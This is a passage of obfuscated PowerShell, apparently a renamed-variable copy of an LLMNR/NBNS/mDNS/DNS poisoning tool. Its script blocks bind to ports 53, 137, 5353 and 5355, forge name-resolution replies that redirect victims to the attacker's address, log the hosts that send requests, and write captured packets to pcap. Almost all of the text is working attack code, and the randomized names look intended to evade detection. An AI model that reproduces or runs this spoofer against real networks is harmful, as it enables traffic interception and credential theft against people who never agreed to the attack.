                                if($TureDGKs99 -eq 'N' -or !$FaziRwBu99.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($CpHYlqmn99[0..1]) + " *"}))
                                {
                                    $quoiHVuw99 = New-Object Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                    $quoiHVuw99.SendBufferSize = 1024
                                    $iwGlcfue99 = New-Object Net.IPEndpoint($vngeYplM99,$fPpLZpwz99)
                                    $quoiHVuw99.SendTo($xCQaEZvg99,$iwGlcfue99) > $null
                                    $quoiHVuw99.Close()
                                }
                                else
                                {
                                    $pLGYzDEG99 = $true
                                }
                                
                            }
                            else
                            {
                                
                                if($vngeYplM99 -eq $IP -and $FaziRwBu99.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($CpHYlqmn99[0..1]) + " *"}))
                                {
                                    $pLGYzDEG99 = $true
                                }
                                
                            }
                            if(!$pLGYzDEG99 -and [System.BitConverter]::ToString($CpHYlqmn99[4..7]) -eq '00-01-00-00')
                            {
                                $wzCNZfgp99.output_queue.Add("$OUuiALWw99 [$(Get-Date -format s)] NBNS request for $JdxmtGsw99<$DPpOatzL99> received from $vngeYplM99 $fLrgSLWG99") > $null
                            }
                            elseif($TureDGKs99 -eq 'Y' -and [System.BitConverter]::ToString($CpHYlqmn99[4..7]) -eq '00-00-00-01' -and $FaziRwBu99.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($CpHYlqmn99[0..1]) + " *"}))
                            {
                                [Byte[]]$ODEFONfi99 = $CpHYlqmn99[($CpHYlqmn99.Length - 4)..($CpHYlqmn99.Length)]
                                $htkdyRvf99 = [System.Net.IPAddress]$ODEFONfi99
                                $htkdyRvf99 = $htkdyRvf99.IPAddressToString
                                if($wzCNZfgp99.valid_host_list -notcontains $JdxmtGsw99)
                                {
                                    $wzCNZfgp99.valid_host_list.Add($JdxmtGsw99) > $null
                                    $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] NBNS response $htkdyRvf99 for $JdxmtGsw99 received from $vngeYplM99 [added to valid host list]") > $null
                                }
                            }
                        }
                    }
                    5353 # mDNS
                    {   
                        
                        if(([System.BitConverter]::ToString($CpHYlqmn99)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($CpHYlqmn99[4..11]) -eq "00-01-00-00-00-00-00-00")
                        {
                            $MeDESEel99[0] += 10
                            $vAxRKiwI99 = Get-NameQueryString 12 $CpHYlqmn99
                            $EOMYKvob99 = $CpHYlqmn99[12..($vAxRKiwI99.Length + 13)]
                            $nIkCruqS99 = ($vAxRKiwI99.Split("."))[0]
                            $MeDESEel99[0] = $EOMYKvob99.Count + $zwiuIZeM99.Length + 23
                            $qJWxobbr99 = "[+]"
                            $riizFguS99 = $EOMYKvob99 +
                                                    0x00,0x01,0x00,0x01 +
                                                    $loalODgk99 +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()
                        
                            $wgejhCPi99 = 0x14,0xe9 +
                                                    $awjzSvYo99[1,0] +
                                                    $MeDESEel99[1,0] +
                                                    0x00,0x00 +
                                                    $CpHYlqmn99[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $riizFguS99
                            
                            $QYKTItDT99 = appraisers -SfjCtTyl99 $nIkCruqS99  -Type "mDNS" -NIPYKgLe99 "QU" -HEKGWWAq99 $mDNS
                            $qJWxobbr99 = $QYKTItDT99[0]
                            $QYKTItDT99 = $QYKTItDT99[1]
                            
                            if($QYKTItDT99 -eq '[response sent]')
                            {
                                $ELYHGrMi99 = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
                                $ELYHGrMi99.SendBufferSize = 1024
                                $XNXmuhez99 = New-Object System.Net.IPEndpoint($vngeYplM99,$fPpLZpwz99)
                                $ELYHGrMi99.SendTo($wgejhCPi99,$XNXmuhez99) > $null
                                $ELYHGrMi99.Close()
                            }
                            $wzCNZfgp99.output_queue.Add("$qJWxobbr99 [$(Get-Date -format s)] mDNS(QU) request $vAxRKiwI99 received from $vngeYplM99 $QYKTItDT99") > $null
                        }
                        elseif(([System.BitConverter]::ToString($CpHYlqmn99)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
                            $CpHYlqmn99[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($CpHYlqmn99[4..11]) -eq "00-02-00-00-00-00-00-00"))
                        {
                            $vAxRKiwI99 = Get-NameQueryString 12 $CpHYlqmn99
                            $EOMYKvob99 = $CpHYlqmn99[12..($vAxRKiwI99.Length + 13)]
                            $nIkCruqS99 = ($vAxRKiwI99.Split("."))[0]
                            $MeDESEel99[0] = $EOMYKvob99.Count + $zwiuIZeM99.Length + 23
                            $qJWxobbr99 = "[+]"
                            $riizFguS99 = $EOMYKvob99 +
                                                    0x00,0x01,0x80,0x01 +
                                                    $loalODgk99 +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()
                        
                            $wgejhCPi99 = 0x14,0xe9 +
                                                    $awjzSvYo99[1,0] +
                                                    $MeDESEel99[1,0] +
                                                    0x00,0x00 +
                                                    $CpHYlqmn99[0,1] +
                                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                    $riizFguS99
                   
                            $QYKTItDT99 = appraisers -SfjCtTyl99 $nIkCruqS99  -Type "mDNS" -NIPYKgLe99 "QM" -HEKGWWAq99 $mDNS
                            $qJWxobbr99 = $QYKTItDT99[0]
                            $QYKTItDT99 = $QYKTItDT99[1]
                            
                            if($QYKTItDT99 -eq '[response sent]')
                            {
                                $ELYHGrMi99 = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                $ELYHGrMi99.SendBufferSize = 1024
                                $XNXmuhez99 = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                                $ELYHGrMi99.SendTo($wgejhCPi99,$XNXmuhez99) > $null
                                $ELYHGrMi99.Close()
                            }
                            $wzCNZfgp99.output_queue.Add("$qJWxobbr99 [$(Get-Date -format s)] mDNS(QM) request $vAxRKiwI99 received from $vngeYplM99 $QYKTItDT99") > $null
                        }
                        
                    }
                    5355 # LLMNR
                    {
                        if([System.BitConverter]::ToString($CpHYlqmn99[($CpHYlqmn99.Length - 4)..($CpHYlqmn99.Length - 3)]) -ne '00-1c') # ignore AAAA for now
                        {
                            $MeDESEel99[0] += $CpHYlqmn99.Length - 2
                            $PegzKhyj99 = $CpHYlqmn99[12..$CpHYlqmn99.Length]
                            $hRzuyJtp99 = "[+]"
                            $PegzKhyj99 += $PegzKhyj99 +
                                                    $REHGJqqF99 +
                                                    0x00,0x04 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()
            
                            $UwPBvRaI99 = 0x14,0xeb +
                                                        $awjzSvYo99[1,0] +
                                                        $MeDESEel99[1,0] +
                                                        0x00,0x00 +
                                                        $CpHYlqmn99[0,1] +
                                                        0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                                        $PegzKhyj99
                
                            $EFVuVIkI99 = [System.Text.Encoding]::UTF8.GetString($CpHYlqmn99[13..($CpHYlqmn99.Length - 4)]) -replace "`0",""
                            if(!$wzCNZfgp99.request_table.ContainsKey($EFVuVIkI99))
                            {
                                $wzCNZfgp99.request_table.Add($EFVuVIkI99.ToLower(),[Array]$vngeYplM99.IPAddressToString)
                                $wzCNZfgp99.request_table_updated = $true
                            }
                            else
                            {
                                $wzCNZfgp99.request_table.$EFVuVIkI99 += $vngeYplM99.IPAddressToString
                                $wzCNZfgp99.request_table_updated = $true
                            }
                            $avOsjCUp99 = $false
                
                            if($TureDGKs99 -eq 'Y' -and $wzCNZfgp99.valid_host_list -notcontains $EFVuVIkI99 -and $vngeYplM99 -ne $IP)
                            {
                                if(($DqXkBhBB99.Exists({param($s) $s -like "20* $EFVuVIkI99"})))
                                {
                                    $NvUKMVYl99 = [DateTime]$DqXkBhBB99.Find({param($s) $s -like "20* $EFVuVIkI99"}).SubString(0,19)
                                    if((Get-Date) -ge $NvUKMVYl99.AddMinutes($xeByEGnv99))
                                    {
                                        $DqXkBhBB99.RemoveAt($DqXkBhBB99.FindIndex({param($s) $s -like "20* $EFVuVIkI99"}))
                                        $FVRfAeul99 = $true
                                    }
                                    else
                                    {
                                        $FVRfAeul99 = $false
                                    }
                                }
                                else
                                {           
                                    $FVRfAeul99 = $true
                                }
                                
                                if($FVRfAeul99)
                                {
                                    $dmZcZWbJ99 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -fkkZmGkZ99 1 -iRDzftBy99 255)})
                                    $NNoDCJTZ99 = $dmZcZWbJ99.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $dmZcZWbJ99 = $dmZcZWbJ99 -replace " ","-"
                                    $YXezXDlp99 = new-Object System.Net.Sockets.UdpClient
                                    $HuImVzkd99 = $CpHYlqmn99[13..($CpHYlqmn99.Length - 5)]
                                    $oGVNXlpH99 = $NNoDCJTZ99 +
                                                            0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                            ($HuImVzkd99.Length - 1) +
                                                            $HuImVzkd99 +
                                                            0x00,0x01,0x00,0x01
                                    $kszsXyPp99 = New-Object System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
                                    $YXezXDlp99.Connect($kszsXyPp99)
                                    $YXezXDlp99.Send($oGVNXlpH99,$oGVNXlpH99.Length)
                                    $YXezXDlp99.Close()
                                    $DqXkBhBB99.Add("$(Get-Date -format s) $dmZcZWbJ99 $EFVuVIkI99") > $null
                                    $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request $EFVuVIkI99 sent to 224.0.0.252") > $null
                                }
                            }
                            $RGzPPQko99 = appraisers -SfjCtTyl99 $EFVuVIkI99 -Type "LLMNR" -HEKGWWAq99 $LLMNR
                            $hRzuyJtp99 = $RGzPPQko99[0]
                            $RGzPPQko99 = $RGzPPQko99[1]
                            if($RGzPPQko99 -eq '[response sent]')
                            {
                                if($TureDGKs99 -eq 'N' -or !$DqXkBhBB99.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($CpHYlqmn99[0..1]) + " *"}))
                                {
                                    $Oculvwhn99 = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
                                    $Oculvwhn99.SendBufferSize = 1024
                                    $BxaNwuAL99 = New-Object System.Net.IPEndpoint($vngeYplM99,$fPpLZpwz99) 
                                    $Oculvwhn99.SendTo($UwPBvRaI99,$BxaNwuAL99) > $null
                                    $Oculvwhn99.Close()
                                }
                                else
                                {
                                    $avOsjCUp99 = $true
                                }
                            }
                           
                            if(!$avOsjCUp99)
                            {
                                $wzCNZfgp99.output_queue.Add("$hRzuyJtp99 [$(Get-Date -format s)] LLMNR request for $EFVuVIkI99 received from $vngeYplM99 $RGzPPQko99") > $null
                            }
                        }
                    }
                }
                switch($fPpLZpwz99)
                {
                    5355 # LLMNR Response
                    {
                    
                        if($TureDGKs99 -eq 'Y' -and $DqXkBhBB99.Exists({param($s) $s -like "* " + [System.BitConverter]::ToString($CpHYlqmn99[0..1]) + " *"}))
                        {
                            $EFVuVIkI99 = [System.Text.Encoding]::UTF8.GetString($CpHYlqmn99[13..($CpHYlqmn99.Length - 4)]) -replace "`0",""
                            [Byte[]]$JfbgpzeX99 = $CpHYlqmn99[($CpHYlqmn99.Length - 4)..($CpHYlqmn99.Length)]
                            $LGYwmXqi99 = [System.Net.IPAddress]$JfbgpzeX99
                            $LGYwmXqi99 = $LGYwmXqi99.IPAddressToString
                            
                            if($wzCNZfgp99.valid_host_list -notcontains $EFVuVIkI99)
                            {
                                $wzCNZfgp99.valid_host_list.Add($EFVuVIkI99) > $null
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $EFVuVIkI99 LLMNR response $LGYwmXqi99 received from $vngeYplM99 [added to valid host list]") > $null
                            }
                            
                        }
                    }
                }
                if($Pcap -and ($oCOyAgdf99 -contains $fPpLZpwz99 -or $oCOyAgdf99 -contains $uODFsrcg99 -or $oCOyAgdf99 -contains 'All'))
                {
                    if($CpHYlqmn99)
                    {
                        $puwDMmGc99 = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
                        $hKchrJLY99 = [System.BitConverter]::GetBytes($fefCbMud99 + 14)
                        
                        $cUsSZjax99 = [System.BitConverter]::GetBytes([Int][Math]::Truncate($puwDMmGc99.TotalSeconds)) + 
                            [System.BitConverter]::GetBytes($puwDMmGc99.Milliseconds) + # should be microseconds but probably doesn't matter
                            $hKchrJLY99 +
                            $hKchrJLY99 +
                            (,0x00 * 12) +
                            0x08,0x00 +
                            $FHGOFqVS99[0..($fefCbMud99 - 1)]
                        switch ($Pcap)
                        {
                            'File'
                            {
                                try
                                {
                                    $yzewmZdX99.Write($cUsSZjax99,0,$cUsSZjax99.Count)    
                                }
                                catch
                                {
                                    $kRjlpgSh99 = $_.Exception.Message
                                    $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
                                    $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
                                }
                        
                            }
                            'Memory'
                            {
                                $wzCNZfgp99.pcap.AddRange($cUsSZjax99) 
                            }
                        }
                    }
                }
            }
        }
    }
    $bqmsYdQw99.Close()
    $RGbImpca99.Dispose()
    $RGbImpca99.Close()
    $yzewmZdX99.Close()
}
$gLJjiPwe99 = 
{
    param ($FpxqDLtp99,$JApKCTck99,$zwiuIZeM99)
    $zPhfPrVl99 = $true
    $ZnUDppif99 = New-object System.Net.IPEndPoint ([IPAddress]::Any,53)
    try
    {
        $wULNHxti99 = New-Object System.Net.Sockets.UdpClient 53
    }
    catch
    {
        $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] Error starting DNS spoofer") > $null
        $kRjlpgSh99 = $_.Exception.Message
        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        $zPhfPrVl99 = $false
    }
    $wULNHxti99.Client.ReceiveTimeout = 5000
    $ADStqJkK99 = [System.BitConverter]::GetBytes($JApKCTck99)
    [Array]::Reverse($ADStqJkK99)
    while($wzCNZfgp99.running -and $zPhfPrVl99)
    {   
        try
        {
            $iiYXeIng99 = $wULNHxti99.Receive([Ref]$ZnUDppif99)
        }
        catch
        {
            $wULNHxti99.Close()
            $wULNHxti99 = New-Object System.Net.Sockets.UdpClient 53
            $wULNHxti99.Client.ReceiveTimeout = 5000
        }
        
        if($iiYXeIng99 -and [System.BitConverter]::ToString($iiYXeIng99[10..11]) -ne '00-01')
        {
            $WTJYQyju99 = Get-NameQueryString 12 $iiYXeIng99
            $NQNxeGVY99 = $iiYXeIng99[12..($WTJYQyju99.Length + 13)]
            $xLtCtGDR99 = "[+]"
            $sqYKzues99 = $iiYXeIng99[0,1] +
                                    0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $NQNxeGVY99 +
                                    0x00,0x01,0x00,0x01 +
                                    $NQNxeGVY99 +
                                    0x00,0x01,0x00,0x01 +
                                    $ADStqJkK99 +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()
            $vngeYplM99 = $ZnUDppif99.Address
            $LPiceXcR99 = appraisers -SfjCtTyl99 $WTJYQyju99 -Type "DNS" -HEKGWWAq99 $DNS
            $xLtCtGDR99 = $LPiceXcR99[0]
            $LPiceXcR99 = $LPiceXcR99[1]
            if($LPiceXcR99 -eq '[response sent]')
            {
                $abdyuECn99 = New-Object System.Net.IPEndpoint($ZnUDppif99.Address,$ZnUDppif99.Port)
                $wULNHxti99.Connect($abdyuECn99)
                $wULNHxti99.Send($sqYKzues99,$sqYKzues99.Length)
                $wULNHxti99.Close()
                $wULNHxti99 = New-Object System.Net.Sockets.UdpClient 53
                $wULNHxti99.Client.ReceiveTimeout = 5000
            }
           
            $wzCNZfgp99.output_queue.Add("$xLtCtGDR99 [$(Get-Date -format s)] DNS request for $WTJYQyju99 received from $vngeYplM99 $LPiceXcR99") > $null
            $iiYXeIng99 = $null
        }
        
    }
    $wULNHxti99.Close()
}
$ALQTLwwh99 = 
{
    param ($FpxqDLtp99,$IEFYrrrG99,$zwiuIZeM99,$aaGIoVaU99,$DzGorPak99,$VBgThnPx99,$SDnpWGxP99,$kbfXrXcm99)
    $QsPvFDLk99 = $true
    $UaBDofBt99 = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)
    try
    {
        $YXezXDlp99 = New-Object System.Net.Sockets.UdpClient
        $YXezXDlp99.ExclusiveAddressUse = $false
        $YXezXDlp99.Client.SetSocketOption("Socket", "ReuseAddress", $true)
        $YXezXDlp99.Client.Bind($UaBDofBt99)
    }
    catch
    {
        $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] Error starting LLMNR spoofer") > $null
        $kRjlpgSh99 = $_.Exception.Message
        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        $QsPvFDLk99 = $false
    }
    $BczKNKsl99 = [IPAddress]"224.0.0.252"
    $YXezXDlp99.JoinMulticastGroup($BczKNKsl99)
    $YXezXDlp99.Client.ReceiveTimeout = 5000
    $REHGJqqF99 = [System.BitConverter]::GetBytes($IEFYrrrG99)
    [Array]::Reverse($REHGJqqF99)
    while($wzCNZfgp99.running -and $QsPvFDLk99)
    {   
        try
        {
            $gqKEpsda99 = $YXezXDlp99.Receive([Ref]$UaBDofBt99)
        }
        catch
        {      
            $YXezXDlp99.Close()
            $UaBDofBt99 = New-Object System.Net.IPEndPoint ([IPAddress]::Any,5355)
            $YXezXDlp99 = New-Object System.Net.Sockets.UdpClient
            $YXezXDlp99.ExclusiveAddressUse = $false
            $YXezXDlp99.Client.SetSocketOption("Socket", "ReuseAddress", $true)
            $YXezXDlp99.Client.Bind($UaBDofBt99)
            $BczKNKsl99 = [IPAddress]"224.0.0.252"
            $YXezXDlp99.JoinMulticastGroup($BczKNKsl99)
            $YXezXDlp99.Client.ReceiveTimeout = 5000
        }
        if($gqKEpsda99 -and [System.BitConverter]::ToString($gqKEpsda99[($gqKEpsda99.Length - 4)..($gqKEpsda99.Length - 3)]) -ne '00-1c') # ignore AAAA for now
        {
            $UwPBvRaI99 = $gqKEpsda99[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
                                     $gqKEpsda99[12..$gqKEpsda99.Length] +
                                     $gqKEpsda99[12..$gqKEpsda99.Length] +
                                     $REHGJqqF99 +
                                     0x00,0x04 +
                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()
        
            $EFVuVIkI99 = [Text.Encoding]::UTF8.GetString($gqKEpsda99[13..($gqKEpsda99[12] + 12)])     
            $vngeYplM99 = $UaBDofBt99.Address
            $hRzuyJtp99 = "[+]"
            if(!$wzCNZfgp99.request_table.ContainsKey($EFVuVIkI99))
            {
                $wzCNZfgp99.request_table.Add($EFVuVIkI99.ToLower(),[Array]$vngeYplM99.IPAddressToString)
                $wzCNZfgp99.request_table_updated = $true
            }
            else
            {
                $wzCNZfgp99.request_table.$EFVuVIkI99 += $vngeYplM99.IPAddressToString
                $wzCNZfgp99.request_table_updated = $true
            }
            $RGzPPQko99 = appraisers -SfjCtTyl99 $EFVuVIkI99 -Type "LLMNR" -HEKGWWAq99 $LLMNR
            $hRzuyJtp99 = $RGzPPQko99[0]
            $RGzPPQko99 = $RGzPPQko99[1]
            if($RGzPPQko99 -eq '[response sent]')
            {
                $vsUZAPIv99 = New-Object Net.IPEndpoint($UaBDofBt99.Address,$UaBDofBt99.Port)
                $YXezXDlp99.Connect($vsUZAPIv99)
                $YXezXDlp99.Send($UwPBvRaI99,$UwPBvRaI99.Length)
                $YXezXDlp99.Close()
                $YXezXDlp99 = New-Object System.Net.Sockets.UdpClient
                $YXezXDlp99.ExclusiveAddressUse = $false
                $YXezXDlp99.Client.SetSocketOption("Socket", "ReuseAddress", $true)
                $YXezXDlp99.Client.Bind($UaBDofBt99)
                $BczKNKsl99 = [IPAddress]"224.0.0.252"
                $YXezXDlp99.JoinMulticastGroup($BczKNKsl99)
                $YXezXDlp99.Client.ReceiveTimeout = 5000
            }
        
            if($gqKEpsda99)
            {
                $wzCNZfgp99.output_queue.Add("$hRzuyJtp99 [$(Get-Date -format s)] LLMNR request for $EFVuVIkI99 received from $vngeYplM99 $RGzPPQko99") > $null
            }
            $gqKEpsda99 = $null
        }
    }
    $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] leaving") > $null
    $YXezXDlp99.Close()
 }
$xRCvKplx99 = 
{
    param ($FpxqDLtp99,$VzyZNqnS99,$GSmWUQVj99,$zwiuIZeM99,$aaGIoVaU99,$DzGorPak99,$VBgThnPx99,$SDnpWGxP99)
    $GeuCIeWa99 = $true
    $OftRUWDB99 = New-object System.Net.IPEndPoint ([IPAddress]::Any,5353)
    try
    {
        $yqGefNxd99 = New-Object System.Net.Sockets.UdpClient
        $yqGefNxd99.ExclusiveAddressUse = $false
        $yqGefNxd99.Client.SetSocketOption("Socket", "ReuseAddress", $true)
        $yqGefNxd99.Client.Bind($OftRUWDB99)
    }
    catch
    {
        $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] Error starting mDNS spoofer") > $null
        $kRjlpgSh99 = $_.Exception.Message
        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        $GeuCIeWa99 = $false
    }
    $ZAeMfSTb99 = [IPAddress]"224.0.0.251"
    $yqGefNxd99.JoinMulticastGroup($ZAeMfSTb99)
    $yqGefNxd99.Client.ReceiveTimeout = 5000
    $loalODgk99 = [System.BitConverter]::GetBytes($VzyZNqnS99)
    [Array]::Reverse($loalODgk99)
    while($wzCNZfgp99.running -and $GeuCIeWa99)
    {   
        try
        {
            $yqpBIpco99 = $yqGefNxd99.Receive([Ref]$OftRUWDB99)
        }
        catch
        {
            $yqGefNxd99.Close()
            $yqGefNxd99 = New-Object System.Net.Sockets.UdpClient
            $yqGefNxd99.ExclusiveAddressUse = $false
            $yqGefNxd99.Client.SetSocketOption("Socket", "ReuseAddress", $true)
            $yqGefNxd99.Client.Bind($OftRUWDB99)
            $ZAeMfSTb99 = [IPAddress]"224.0.0.251"
            $yqGefNxd99.JoinMulticastGroup($ZAeMfSTb99)
            $yqGefNxd99.Client.ReceiveTimeout = 5000
        }
        if(([System.BitConverter]::ToString($yqpBIpco99)).EndsWith("-00-01-80-01") -and [System.BitConverter]::ToString($yqpBIpco99[4..11]) -eq "00-01-00-00-00-00-00-00")
        {
            $vngeYplM99 = $OftRUWDB99.Address
            $vAxRKiwI99 = Get-NameQueryString 12 $yqpBIpco99
            $nIkCruqS99 = ($vAxRKiwI99.Split("."))[0]
            $qJWxobbr99 = "[+]"
            $wgejhCPi99 = $yqpBIpco99[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $yqpBIpco99[12..($vAxRKiwI99.Length + 13)] +
                                    0x00,0x01,0x00,0x01 +
                                    $loalODgk99 +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()
            
            $QYKTItDT99 = appraisers -SfjCtTyl99 $nIkCruqS99  -Type "mDNS" -NIPYKgLe99 "QU" -HEKGWWAq99 $mDNS
            $qJWxobbr99 = $QYKTItDT99[0]
            $QYKTItDT99 = $QYKTItDT99[1]
            if($QYKTItDT99 -eq '[response sent]')
            {
                $vSugxtpu99 = New-Object Net.IPEndpoint($OftRUWDB99.Address,$OftRUWDB99.Port)
                $yqGefNxd99.Connect($vSugxtpu99)
                $yqGefNxd99.Send($wgejhCPi99,$wgejhCPi99.Length)
                $yqGefNxd99.Close()
                $yqGefNxd99 = New-Object System.Net.Sockets.UdpClient
                $yqGefNxd99.ExclusiveAddressUse = $false
                $yqGefNxd99.Client.SetSocketOption("Socket", "ReuseAddress", $true)
                $yqGefNxd99.Client.Bind($OftRUWDB99)
                $ZAeMfSTb99 = [IPAddress]"224.0.0.251"
                $yqGefNxd99.JoinMulticastGroup($ZAeMfSTb99)
                $yqGefNxd99.Client.ReceiveTimeout = 5000
            }
        
            if($yqpBIpco99)
            {
                $wzCNZfgp99.output_queue.Add("$qJWxobbr99 [$(Get-Date -format s)] mDNS(QU) request $vAxRKiwI99 received from $vngeYplM99 $QYKTItDT99") > $null
            }
            $yqpBIpco99 = $null
        }
        elseif(([System.BitConverter]::ToString($yqpBIpco99)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
            $yqpBIpco99[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($yqpBIpco99[4..11]) -eq "00-02-00-00-00-00-00-00"))
        {
            $vngeYplM99 = $OftRUWDB99.Address
            $vAxRKiwI99 = Get-NameQueryString 12 $yqpBIpco99
            $nIkCruqS99 = ($vAxRKiwI99.Split("."))[0]
            $qJWxobbr99 = "[+]"
            $wgejhCPi99 = $yqpBIpco99[0,1] +
                                    0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
                                    $yqpBIpco99[12..($vAxRKiwI99.Length + 13)] +
                                    0x00,0x01,0x00,0x01 +
                                    $loalODgk99 +
                                    0x00,0x04 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes()        
                
            $QYKTItDT99 = appraisers -SfjCtTyl99 $nIkCruqS99  -Type "mDNS" -NIPYKgLe99 "QM" -HEKGWWAq99 $mDNS
            $qJWxobbr99 = $QYKTItDT99[0]
            $QYKTItDT99 = $QYKTItDT99[1]
            if($QYKTItDT99 -eq '[response sent]')
            {
                $vSugxtpu99 = New-Object Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
                $yqGefNxd99.Connect($vSugxtpu99)
                $yqGefNxd99.Send($wgejhCPi99,$wgejhCPi99.Length)
                $yqGefNxd99.Close()
                $yqGefNxd99 = new-Object System.Net.Sockets.UdpClient 5353
                $ZAeMfSTb99 = [IPAddress]"224.0.0.251"
                $yqGefNxd99.JoinMulticastGroup($ZAeMfSTb99)
                $yqGefNxd99.Client.ReceiveTimeout = 5000
            }
            if($yqpBIpco99)                   
            {
                $wzCNZfgp99.output_queue.Add("$qJWxobbr99 [$(Get-Date -format s)] mDNS(QM) request $vAxRKiwI99 received from $vngeYplM99 $QYKTItDT99") > $null
            }
            $yqpBIpco99 = $null
        }
    }
    $yqGefNxd99.Close()
}
$RXizXwDv99 = 
{
    param ($FpxqDLtp99,$IP,$ZMtTESED99,$tPiDssiv99,$zwiuIZeM99,$DzGorPak99,$aaGIoVaU99,
        $SDnpWGxP99,$VBgThnPx99,$kbfXrXcm99)
    $TyelyZft99 = $true
    $PgCWVPrk99 = New-Object System.Net.IPEndPoint ([IPAddress]::Broadcast,137)
    try
    {
        $pjtZHdCg99 = New-Object System.Net.Sockets.UdpClient 137
    }
    catch
    {
        $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] Error starting NBNS spoofer") > $null
        $kRjlpgSh99 = $_.Exception.Message
        $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
        $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        $TyelyZft99 = $false
    }
    $pjtZHdCg99.Client.ReceiveTimeout = 5000
    $ckLOaHna99 = [System.BitConverter]::GetBytes($ZMtTESED99)
    [Array]::Reverse($ckLOaHna99)
    while($wzCNZfgp99.running -and $TyelyZft99)
    {
        
        try
        {
            $QLzUWiXo99 = $pjtZHdCg99.Receive([Ref]$PgCWVPrk99)
        }
        catch
        {
            $pjtZHdCg99.Close()
            $pjtZHdCg99 = New-Object System.Net.Sockets.UdpClient 137
            $pjtZHdCg99.Client.ReceiveTimeout = 5000
        }
        if($QLzUWiXo99 -and [System.BitConverter]::ToString($QLzUWiXo99[10..11]) -ne '00-01')
        {
            $ckLOaHna99 = [System.BitConverter]::GetBytes($ZMtTESED99)
            [Array]::Reverse($ckLOaHna99)
            $xCQaEZvg99 = $QLzUWiXo99[0,1] +
                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                    $QLzUWiXo99[13..$QLzUWiXo99.Length] +
                                    $ckLOaHna99 +
                                    0x00,0x06,0x00,0x00 +
                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zwiuIZeM99)).GetAddressBytes() +
                                    0x00,0x00,0x00,0x00
            $vngeYplM99 = $PgCWVPrk99.Address
